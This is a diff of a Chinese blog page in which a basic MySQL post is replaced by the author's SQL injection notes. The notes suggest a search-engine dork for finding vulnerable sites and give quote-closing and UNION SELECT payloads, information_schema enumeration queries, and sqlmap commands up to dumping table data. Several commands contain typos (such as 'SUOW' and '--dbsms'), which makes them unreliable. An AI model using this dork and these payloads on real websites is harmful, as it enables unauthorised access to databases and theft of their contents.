@@ -4,7 +4,7 @@
   <!-- 元数据 -->
   <meta charset="utf-8">
   <link rel="icon" href="/images/logo.webp">
-  <title>SQL | XKLibra</title>
+  <title>SQL-injection | XKLibra</title>
   <meta name="author" content="XKLibra" />
   <meta http-equiv="Cache-Control" content="no-transform" />
   <meta http-equiv="Cache-Control" content="no-siteapp" />
@@ -13,22 +13,22 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
   <meta name="format-detection" content="telphone=no, email=no" />
   
-    <meta name="keywords" content="SER, SQL, liunx" />
+    <meta name="keywords" content="SQL, liunx kail, 网络攻防" />
   
-  <meta name="description" content="MYSQL在Liunx上安装DB服务  安装12apt install mariadb-server &#x2F;&#x2F;安装MYsql服务端root@host# mysql -u root -p  &#x2F;&#x2F;输入ROOT用户的密码  基础使用注意SQL语句以分号作为结束标识   12root@host# mysql -u root -p  &#x2F;&#x2F;输入ROOT用户的密码maradb (noep)&gt; use [数据库">
+  <meta name="description" content="SQL-INJECTION这是以我的笔记来写的，更新中……  建议浏览器安装的插件： Hackbar, HTTP header Live ,Omnibug , Tamper Data  在百度中搜索inurl:index.php?id&#x3D; 等等的网站可能有SQL漏洞 开始之前要知道以下内容：查找命令： 1234567891011121314SHOW dtatbases;">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SQL">
-<meta property="og:url" content="http://example.com/2022/05/11/SQL/index.html">
+<meta property="og:title" content="SQL-injection">
+<meta property="og:url" content="http://example.com/2022/05/11/SQL-injection/index.html">
 <meta property="og:site_name" content="XKLibra">
-<meta property="og:description" content="MYSQL在Liunx上安装DB服务  安装12apt install mariadb-server &#x2F;&#x2F;安装MYsql服务端root@host# mysql -u root -p  &#x2F;&#x2F;输入ROOT用户的密码  基础使用注意SQL语句以分号作为结束标识   12root@host# mysql -u root -p  &#x2F;&#x2F;输入ROOT用户的密码maradb (noep)&gt; use [数据库">
+<meta property="og:description" content="SQL-INJECTION这是以我的笔记来写的，更新中……  建议浏览器安装的插件： Hackbar, HTTP header Live ,Omnibug , Tamper Data  在百度中搜索inurl:index.php?id&#x3D; 等等的网站可能有SQL漏洞 开始之前要知道以下内容：查找命令： 1234567891011121314SHOW dtatbases;">
 <meta property="og:locale">
 <meta property="og:image" content="http://example.com/images/logo.webp">
 <meta property="article:published_time" content="2022-05-11T13:12:14.000Z">
-<meta property="article:modified_time" content="2022-05-11T13:48:49.540Z">
+<meta property="article:modified_time" content="2022-05-12T12:11:20.902Z">
 <meta property="article:author" content="XKLibra">
-<meta property="article:tag" content="SER">
 <meta property="article:tag" content="SQL">
-<meta property="article:tag" content="liunx">
+<meta property="article:tag" content="网络攻防">
+<meta property="article:tag" content="liunx kail">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/images/logo.webp">
   
@@ -169,11 +169,11 @@
 
             <article itemscope itemtype="https://schema.org/Article">
     
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/11/SQL/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/11/SQL-injection/">
     <div class="kratos-hentry kratos-post-inner clearfix">
         <header class="kratos-entry-header">
             
-                <h1 class="kratos-entry-title text-center" itemprop="name headline">SQL</h1>
+                <h1 class="kratos-entry-title text-center" itemprop="name headline">SQL-injection</h1>
             
             
             <ul class="kratos-post-meta text-center">
@@ -185,12 +185,12 @@
                     <i class="fa fa-edit"></i> 
                     
                     
-                        ~1.83K
+                        ~3.57K
                     
                     字
                 </li>
                 
-                    <li id="/2022/05/11/SQL/" class="leancloud_visitors" data-flag-title="SQL">
+                    <li id="/2022/05/11/SQL-injection/" class="leancloud_visitors" data-flag-title="SQL-injection">
                         <i class="fa fa-eye"></i>
                         <span class="leancloud-visitors-count"> </span> 次阅读
                     </li>
@@ -201,43 +201,102 @@
         <div class="kratos-post-content">
             <div id="expire-alert" class="alert alert-warning hidden" role="alert">
                 <div class="icon"><i class="fa fa-warning"></i></div>
-                <div class="text"><p>本文最后编辑于 <time datetime="1652276929540"></time> 前，其中的内容可能需要更新。</p></div>
+                <div class="text"><p>本文最后编辑于 <time datetime="1652357480902"></time> 前，其中的内容可能需要更新。</p></div>
             </div>
             
                 <div class="kratos-post-inner-toc">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MYSQL"><span class="toc-number">1.</span> <span class="toc-text">MYSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E8%A3%85"><span class="toc-number">1.1.</span> <span class="toc-text">安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text">基础使用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.2.1.</span> <span class="toc-text">查询语句</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.3.</span> <span class="toc-text">SQL数据库</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%9B%E5%BB%BA%E4%B8%8E%E5%88%A0%E9%99%A4"><span class="toc-number">1.3.1.</span> <span class="toc-text">数据库创建与删除</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E4%B8%8E%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE%E8%A1%A8%E5%8D%95"><span class="toc-number">1.3.2.</span> <span class="toc-text">创建与删除数据表单</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%92%E5%85%A5%E6%95%B0%E6%8D%AE"><span class="toc-number">1.3.3.</span> <span class="toc-text">插入数据</span></a></li></ol></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-INJECTION"><span class="toc-number">1.</span> <span class="toc-text">SQL-INJECTION</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B%E4%B9%8B%E5%89%8D%E8%A6%81%E7%9F%A5%E9%81%93%E4%BB%A5%E4%B8%8B%E5%86%85%E5%AE%B9%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">开始之前要知道以下内容：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%8F%AF%E4%BB%A5%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.</span> <span class="toc-text">如何判断是否可以注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E6%98%AF%E4%BB%80%E4%B9%88%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.3.</span> <span class="toc-text">如何判断是什么数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%BA%93%E5%90%8D"><span class="toc-number">1.4.</span> <span class="toc-text">获取库名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%90%8D"><span class="toc-number">1.5.</span> <span class="toc-text">获取表名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%88%97%E5%90%8D"><span class="toc-number">1.6.</span> <span class="toc-text">获取列名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE"><span class="toc-number">1.7.</span> <span class="toc-text">获取数据</span></a></li></ol></li></ol>
                 </div>
             
             <hr />
-            <div itemprop="articleBody"><h1 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h1><pre><code>在Liunx上安装DB服务
-</code></pre>
-<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install mariadb-server //安装MYsql服务端</span><br><span class="line">root@host# mysql -u root -p  //输入ROOT用户的密码</span><br></pre></td></tr></table></figure>
-
-<h2 id="基础使用"><a href="#基础使用" class="headerlink" title="基础使用"></a>基础使用</h2><div class="alert alert-info"><div class="icon"><i class="fa fa-info"></i></div><div class="text"><p>注意SQL语句以分号作为结束标识</p>
+            <div itemprop="articleBody"><h1 id="SQL-INJECTION"><a href="#SQL-INJECTION" class="headerlink" title="SQL-INJECTION"></a>SQL-INJECTION</h1><div class="alert alert-primary"><div class="icon"><i class="fa fa-refresh"></i></div><div class="text"><p>这是以我的笔记来写的，更新中……</p>
 </div></div>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@host# mysql -u root -p  //输入ROOT用户的密码</span><br><span class="line">maradb (noep)&gt; use [数据库name]  //选择要操作的Mysql数据库</span><br></pre></td></tr></table></figure>
-
-<h3 id="查询语句"><a href="#查询语句" class="headerlink" title="查询语句"></a>查询语句</h3><p><strong>show</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">SHOW dtatbases;              //列出数据库列表</span><br><span class="line"></span><br><span class="line">SUOW tables;                 //显示指定数据库的所有表</span><br><span class="line"></span><br><span class="line">SUOW columns from [Name];    //查看指定数据表的属性，属性类型，主键信息 ，是否NULL，默认值等其他信息</span><br><span class="line"></span><br><span class="line">SUOW index from [Name];      //显示数据表的详细索引信息，包括主键。</span><br><span class="line"></span><br><span class="line">SUOW table status [FROM (数据库name)] [LIKE &quot;pattern&quot;]; //表名以XXXXX开头的表的信息</span><br><span class="line"></span><br><span class="line">SUOW table status [FROM (数据库name)] [LIKE &quot;pattern&quot;] \G;  //加上 \G 查询结果按列打印</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><strong>select</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Select schema_name from information_schema.SCHEMATA;   //列出数据库列表</span><br><span class="line"></span><br><span class="line">Select table_name from information_schema.tables where table_schema=&#x27;库NAME&#x27;  </span><br><span class="line">//显示指定数据库的所有表</span><br><span class="line"></span><br><span class="line">Select column_name from information_schema.tabls where table_schema=&#x27;库NAME&#x27; and table_name=&#x27;[Name]&#x27;  //查看指定数据表的属性，属性类型，主键信息 ，是否NULL，默认值等其他信息</span><br><span class="line"></span><br><span class="line">Select * from table_name ;</span><br></pre></td></tr></table></figure>
-
-<h2 id="SQL数据库"><a href="#SQL数据库" class="headerlink" title="SQL数据库"></a>SQL数据库</h2><h3 id="数据库创建与删除"><a href="#数据库创建与删除" class="headerlink" title="数据库创建与删除"></a>数据库创建与删除</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE 数据库名; //创建</span><br><span class="line"></span><br><span class="line">DROP DATABASE 数据库名;  //删除</span><br><span class="line"></span><br><span class="line">maradb (noep)&gt; use [数据库name]  //选择要操作的Mysql数据库</span><br></pre></td></tr></table></figure>
-
-<h3 id="创建与删除数据表单"><a href="#创建与删除数据表单" class="headerlink" title="创建与删除数据表单"></a>创建与删除数据表单</h3><pre><code>创建：
+<p><strong>建议浏览器安装的插件：</strong></p>
+<pre><code>Hackbar, HTTP header Live ,Omnibug , Tamper Data
 </code></pre>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">maradb (QWQ)&gt; CREATE TABLE user_tbl(</span><br><span class="line">   -&gt; user_id INT NOT NULL AUTO_INCREMENT,</span><br><span class="line">   -&gt; user_name VARCHAR(100) NOT NULL,</span><br><span class="line">   -&gt; user_passwd VARCHAR(50) NOT NULL,</span><br><span class="line">   -&gt; user_job VARCHAR(40) NOT NULL,</span><br><span class="line">   -&gt; submission_date DATE,</span><br><span class="line">   -&gt; PRIMARY KEY ( user_id )</span><br><span class="line">   -&gt; )ENGINE=InnoDB DEFAULT CHARSET=utf8;</span><br><span class="line">Query OK, 0 rows affected (0.16 sec)</span><br></pre></td></tr></table></figure>
+<p>在百度中搜索inurl:index.php?id&#x3D; 等等的网站可能有SQL漏洞</p>
+<h2 id="开始之前要知道以下内容："><a href="#开始之前要知道以下内容：" class="headerlink" title="开始之前要知道以下内容："></a><strong>开始之前要知道以下内容：</strong></h2><p><strong>查找命令：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> dtatbases;                   #列出数据库列表</span><br><span class="line">SUOW tables;                      #显示指定数据库的所有表</span><br><span class="line">SUOW columns <span class="keyword">from</span> [Name];         #查看指定数据表的属性，属性类型，主键信息 ，是否<span class="keyword">NULL</span>，默认值等其他信息</span><br><span class="line">SUOW index <span class="keyword">from</span> [Name];   # 显示数据表的详细索引信息，包括主键。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">Select</span> schema_name <span class="keyword">from</span> information_schema.SCHEMATA;   # 列出数据库列表</span><br><span class="line"></span><br><span class="line"><span class="keyword">Select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;库NAME&#x27;</span>  #显示指定数据库的所有表</span><br><span class="line"></span><br><span class="line"><span class="keyword">Select</span> column_name <span class="keyword">from</span> information_schema.tabls <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;库NAME&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;[Name]&#x27;</span>  </span><br><span class="line"># 查看指定数据表的属性，属性类型，主键信息 ，是否<span class="keyword">NULL</span>，默认值等其他信息</span><br><span class="line"></span><br><span class="line"><span class="keyword">Select</span> [你查到的列（有几个写几个）] <span class="keyword">from</span> [表名]</span><br></pre></td></tr></table></figure>
 
-<pre><code>删除：
+<p><strong>填充语句：</strong></p>
+<p><code>SQL语句，[字段数]，[字段数2]，……  //查到几个写几个</code></p>
+<p><strong>SQL注释：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;#&#x27;</span><br><span class="line">&#x27;-- &#x27;</span><br><span class="line">&#x27;--+&#x27; //payload</span><br></pre></td></tr></table></figure>
+
+<p><strong>多行数据变一行的查看命令:</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># Limit <span class="number">0</span>,<span class="number">1</span>,…..   <span class="operator">/</span><span class="operator">/</span>慢一点</span><br><span class="line"># 将<span class="keyword">Select</span> table_name ….. 改为 <span class="keyword">Select</span> <span class="keyword">Select</span> group_concat(XXXX_name) <span class="comment">--+PS</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.TABLES <span class="keyword">where</span> TABLE_SCHEMA<span class="operator">=</span><span class="string">&#x27;库名&#x27;</span> <span class="comment">--+  //获取表名</span></span><br><span class="line"><span class="keyword">Select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> TABLE_SCHEMA<span class="operator">=</span><span class="string">&#x27;库名&#x27;</span> <span class="keyword">and</span> tab_name<span class="operator">=</span><span class="string">&#x27;表名&#x27;</span> <span class="comment">--+  //获取列名</span></span><br><span class="line"><span class="keyword">Select</span> group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata <span class="comment">--+//列出数据库</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>查询字段 <code>order by [num]</code>:</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="operator">*</span> <span class="keyword">from</span> XXXX <span class="keyword">order</span> <span class="keyword">by</span> [num]</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> [num]  #DO it</span><br></pre></td></tr></table></figure>
+
+<pre><code>UNM = 自然数 1-9 等
+
+在用户名输入order by [1 - X]可查询有几个字段
+
+如果报错说明没有,如果没有报错说明有
 </code></pre>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP TABLE table_name ;</span><br></pre></td></tr></table></figure>
+<p><strong>Union拼接语句:</strong></p>
+<pre><code>union可将两条SQL语句同时执行
+</code></pre>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="operator">*</span> <span class="keyword">from</span> XXXXX <span class="keyword">where</span> <span class="keyword">user</span> <span class="operator">=</span> <span class="string">&#x27;-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> database(), <span class="number">1</span> # <span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO table_name ( field1, field2,...fieldN )</span><br><span class="line">                       VALUES</span><br><span class="line">                       ( value1, value2,...valueN );</span><br></pre></td></tr></table></figure>
+<p><strong>闭合:</strong></p>
+<pre><code>将SQL语句进行闭合
+</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;</span><br><span class="line">&quot;&quot;</span><br><span class="line">(&#x27;&#x27;)</span><br><span class="line">#PS:写 -1 在user中是为了防止SQL语句的干扰，当然看情况也可以不写</span><br><span class="line">Select * from XXXXX where user = &#x27; -1 union select database(), 1 &#x27; and password= &#x27;&#x27;# Run ERRAR</span><br><span class="line"></span><br><span class="line">Select * from XXXXX where user = &#x27;-1&#x27; union select database(), 1 # &#x27;and password=&#x27;&#x27;# Run yse</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>PS：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; INSERT INTO user_tbl </span><br><span class="line">    -&gt; (user_name,  user_passwd, user_job, submission_date)</span><br><span class="line">    -&gt; VALUES</span><br><span class="line">    -&gt; (&quot;XKLibra&quot;, &quot;114514&quot;, sleep, NOW());</span><br></pre></td></tr></table></figure>
+<p><strong>SQLMAP基础使用</strong></p>
+<p>常用命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u [&quot;URL&quot;]</span><br><span class="line">sqlmap -u [&quot;URL&quot;] --current-db	//获取当前库名</span><br><span class="line">sqlmap -u [&quot;URL&quot;] --level=5 --risk=3 --dbs //获取所有库名</span><br><span class="line">sqlmap -u [&quot;URL&quot;] --level=5 --risk=3 --dbsms=[数据库类型] -D &quot;[库名]&quot; --tables	//获取某一个库的所有表名</span><br><span class="line">sqlmap -u [&quot;URL&quot;] --level=5 --risk=3 --dbsms=[数据库类型] -D &quot;[库名]&quot; -T &quot;[表名]&quot; --col	//获取某一个库某一个表的所有列名</span><br><span class="line">sqlmap -u [&quot;URL&quot;] --level=5 --risk=3 --dbsms=[数据库类型] -D &quot;[库名]&quot; -T &quot;[表名]&quot; -C &quot;[列名1],[列名2]&quot; --dump	//获取所有的数据</span><br></pre></td></tr></table></figure>
+
+<p><code>risk</code>为风险系数，<code>level</code>为攻击等级 &#x2F;&#x2F;慎重修改</p>
+<p><strong>大致过程</strong></p>
+<ol>
+<li>如何判断是否可以注入</li>
+<li>如何判断是什么数据库</li>
+<li>获取库名</li>
+<li>获取表名</li>
+<li>获取列名</li>
+<li>获取数据</li>
+</ol>
+<hr>
+<h2 id="如何判断是否可以注入"><a href="#如何判断是否可以注入" class="headerlink" title="如何判断是否可以注入"></a>如何判断是否可以注入</h2><pre><code>在URL的后面加上?id=1&#39; 或者 ?id=1&#39; and 1=1 输入并回车然后输入?id=1&#39; and 1=2 再回车，查看是否有变化
+</code></pre>
+<p>PS: HTTPS⑧行，HTTP彳亍</p>
+<h2 id="如何判断是什么数据库"><a href="#如何判断是什么数据库" class="headerlink" title="如何判断是什么数据库"></a>如何判断是什么数据库</h2><pre><code>在URL的后面加上?id=1&#39;看报错是否是SQL一类的
+
+或者使用sqlmap等工具，例如：
+</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap - u [URL]</span><br></pre></td></tr></table></figure>
+
+<h2 id="获取库名"><a href="#获取库名" class="headerlink" title="获取库名"></a>获取库名</h2><p>开始前要查询字段有多少</p>
+<p>一般查库：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[URL]?id=1&#x27; union select database() --+</span><br></pre></td></tr></table></figure>
+
+<p>SQLMAP工具查库：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u [&quot;URL&quot;] --current-db</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h2><p>一般查表:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.TABLES <span class="keyword">where</span> TABLE_SCHEMA<span class="operator">=</span><span class="string">&#x27;库名&#x27;</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p>SQLMAP工具：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u [&quot;URL&quot;] --level=5 --risk=3 --dbsms=[什么数据库] -D &quot;[库名]&quot; --tables</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h2><p>一般查列:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> TABLE_SCHEMA<span class="operator">=</span><span class="string">&#x27;库名&#x27;</span> <span class="keyword">and</span> tab_name<span class="operator">=</span><span class="string">&#x27;表名&#x27;</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p>SQLMAP工具：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u [&quot;URL&quot;] --level=5 --risk=3 --dbsms=[什么数据库] -D &quot;[库名]&quot; -T &quot;[表名]&quot; --col	//获取某一个库某一个表的所有列名</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h2><p>一般获取数据:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata <span class="comment">--+ //列出数据库</span></span><br></pre></td></tr></table></figure>
+
+<p>SQLMAP工具：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u [&quot;URL&quot;] --level=5 --risk=3 --dbsms=[什么数据库] -D &quot;[库名]&quot; -T &quot;[表名]&quot; -C &quot;[列名1],[列名2]&quot; --dump</span><br></pre></td></tr></table></figure>
 </div>
         </div>
         
@@ -291,7 +350,7 @@
     <script type="text/javascript">
         $(()=>{
             new QRCode("wechat-qr", {
-                text: "http://example.com/2022/05/11/SQL/",
+                text: "http://example.com/2022/05/11/SQL-injection/",
                 width: 150,
                 height: 150,
                 correctLevel : QRCode.CorrectLevel.H
@@ -303,13 +362,14 @@
             const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
             const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
             const twitterBase   = "https://twitter.com/intent/tweet?";
-            const hostUrl       = "http://example.com/2022/05/11/SQL/";
-            const title         = "「SQL」";
-            const excerpt       = `MYSQL在Liunx上安装DB服务
+            const hostUrl       = "http://example.com/2022/05/11/SQL-injection/";
+            const title         = "「SQL-injection」";
+            const excerpt       = `SQL-INJECTION这是以我的笔记来写的，更新中……
 
-安装12apt install mariadb-server //安装MYsql服务端root@host# mysql -u root -p  //输入ROOT用户的密码
+建议浏览器安装的插件：
+Hackbar, HTTP header Live ,Omnibug , Tamper Data
 
-基础使用注意SQL语...`;
+在百度中搜索inurl:index.php?id...`;
             let _URL;
             switch (dest) {
                 case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
@@ -328,10 +388,10 @@
             <div class="footer-tag clearfix">
                 <div class="pull-left">
                 <i class="fa fa-tags"></i>
-                    <a class="tag-none-link" href="/tags/SER/" rel="tag">SER</a>, <a class="tag-none-link" href="/tags/SQL/" rel="tag">SQL</a>, <a class="tag-none-link" href="/tags/liunx/" rel="tag">liunx</a>
+                    <a class="tag-none-link" href="/tags/SQL/" rel="tag">SQL</a>, <a class="tag-none-link" href="/tags/liunx-kail/" rel="tag">liunx kail</a>, <a class="tag-none-link" href="/tags/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/" rel="tag">网络攻防</a>
                 </div>
                 <div class="pull-date">
-                    <time datetime="2022-05-11T13:48:49.540Z" itemprop="dateModified">最后编辑：2022-05-11</time>
+                    <time datetime="2022-05-12T12:11:20.902Z" itemprop="dateModified">最后编辑：2022-05-12</time>
                 </div>
             </div>
         </footer>
@@ -340,9 +400,13 @@
         <nav class="navigation post-navigation clearfix" role="navigation">
             
             <div class="nav-previous clearfix">
-                <a title=" SQL-injection" href="/2022/05/11/SQL-injection/">&lt; 上一篇</a>
+                <a title=" Windows 服务快捷启动命令" href="/2022/05/10/Windows-SQSC/">&lt; 上一篇</a>
             </div>
             
+            
+            <div class="nav-next clearfix">
+                <a title=" SQL" href="/2022/05/11/SQL/">下一篇 &gt;</a>
+            </div>
             
         </nav>
     
@@ -357,7 +421,7 @@
                 appKey: '0YpBzBVjx6Hpv6CXKeYmMkkV',
                 visitor: true,
                 enableQQ: false,
-                path: '/2022/05/11/SQL/'
+                path: '/2022/05/11/SQL-injection/'
             });
         }
         if (typeof Valine === 'undefined') {
@@ -434,7 +498,7 @@
         <span class="toc-progress-bar" role="progressbar" aria-label="阅读进度："></span>
     </h4>
     <div class="textwidget">
